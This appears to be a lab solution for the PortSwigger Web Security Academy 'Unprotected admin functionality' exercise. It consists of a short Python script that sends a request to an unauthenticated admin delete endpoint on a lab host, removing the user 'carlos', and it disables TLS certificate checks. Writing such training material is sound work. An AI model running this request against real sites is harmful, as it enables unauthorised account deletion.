# Lab: Unprotected admin functionality

Link to lab: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality

## Solution

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0a7500710489a668c0467766009c0096.web-security-academy.net/'

params = {
    'username': 'carlos',
}

response = requests.get(
    url + 'administrator-panel/delete',
    params=params,
    verify=False,
)
print(response.text)
```